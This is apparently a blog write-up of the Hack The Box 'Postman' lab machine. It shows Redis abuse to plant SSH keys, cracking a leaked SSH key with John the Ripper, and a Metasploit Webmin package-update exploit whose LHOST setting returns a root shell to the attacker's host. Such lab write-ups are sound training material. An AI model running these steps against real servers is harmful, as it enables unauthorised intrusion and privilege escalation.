---
layout: single
title: Postman Writeup
date: '2020-04-30 15:32:00'
tags:
- hack-the-box
sidebar:
  - title: "Difficulty: Easy"
    image: /images/posts/2020/2020-04-30-postman-writeup/postman_logo.png
    text: "https://app.hackthebox.eu/machines/215"
typora-copy-images-to: ../images/posts/2020/${filename}/
---

A fairly straight forward easy box that nevertheless taught me something new…

## Enumeration

Starting with the usual Autorecon we turn up the following open ports:

- 22 - running SSH as expected
- 80 - running Apache and a pretty blank site
- 10,000 - running Webmin over SSL
- 6379 - running Redis

I had a quick look at the site on port 80, but this seemed to be a fairly empty site with no way of submitting information and nothing in the source, so I moved on. SSH wasn't doing anything crazy, so I looked at Webmin.

Webmin was more interesting, as looking at the Nikto output for port 10,000 we can see the server version is reported as `MiniServ/1.91`  
This relates to the version of Webmin and a search on [ExploitDB](https://www.exploit-db.com/) shows a few possible exploits for this version. One relates to a backdoor that was inserted that allows Remote Code Execution via the password change feature, but in this instance that feature was disabled and so this could not be exploited. Another vulnerability involves the package update command, but this required a login.

I moved on to look at Redis at this point. I connected to the server using `redis-cli -h 10.10.10.160 -p 6379` and using `KEYS *` determined that database was empty. I had a recollection that Redis could be exploited to upload SSH keys and found the following [article](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)which suggested it was indeed possible.

## Initial Exploitation

Having found a possible way in using Redis I did some more hunting and found a Python [script](https://github.com/Avinash-acid/Redis-Server-Exploit) that automated the steps. Saving this as `exploit.py` and running it as `./exploit.py 10.10.10.160 redis` (where redis is the user the Redis server is running as) got me a shell via SSH as the redis user. However, the user.txt file was in /home/Matt so we had some more work to do.

## Lateral movement

Have a quick look around the redis account and what I could see in the home directory of Matt didn't show anything too useful, and usual tricks such as checking sudo access with `sudo -l` didn't show anything special privileges. To speed things up I copied [LinEnum](https://github.com/rebootuser/LinEnum) across to the server and let it loose. This turned up an interesting .bak file, `/opt/id_rsa.bak` which sounds like an SSH private key file.

![Annotation-2019-12-02-113254](../images/posts/2020/2020-04-30-postman-writeup/Annotation-2019-12-02-113254.png)

If we try and use this file using `ssh -i` to connect via SSH as the Matt account we get prompted for a password.

Next, I used `scp` to copy this file to my Kali box and then used `/usr/share/john/ssh2john.py id_rsa.matt > matt.key` to convert the file to format that John the Ripper can understand. I then kicked off John using the usual Rockyou wordlist which found a hit very quickly.

![Annotation-2019-12-02-113254_2](../images/posts/2020/2020-04-30-postman-writeup/Annotation-2019-12-02-113254_2.png)

I then tried to login via SSH as Matt but got `Connection Closed` after I successfully authenticated. Using my redis SSH session I looked at the `/etc/ssh/sshd_config` and found that Matt had specifically been blocked from using SSH.

I then tried `su Matt` while logged in as redis user which worked and I could then read the `user.txt` file.

![Annotation-2019-12-02-113254_3](../images/posts/2020/2020-04-30-postman-writeup/Annotation-2019-12-02-113254_3.png)

## Getting root

Given we now have the username and password of Matt I tried logging into Webmin using these and found they worked. Matt only seemed to have access to do Package Updates, but earlier we found a exploit for a vulnerabily in this area. The exploit was in the form of a Metasploit module, and while I usually recode these to do the exploit manually, I decided to be lazy and just use Metasploit.

After starting msfconsole I used:
```bash
    use exploit/linux/http/webmin_packageup_rce
    set RHOST 10.10.10.160
    set LHOST 10.10.14.5
    set USERNAME Matt
    set PASSWORD computer2008
    set SSL true
    exploit
```
This then gives us a root shell

![Annotation-2019-12-02-113254_4](../images/posts/2020/2020-04-30-postman-writeup/Annotation-2019-12-02-113254_4.png)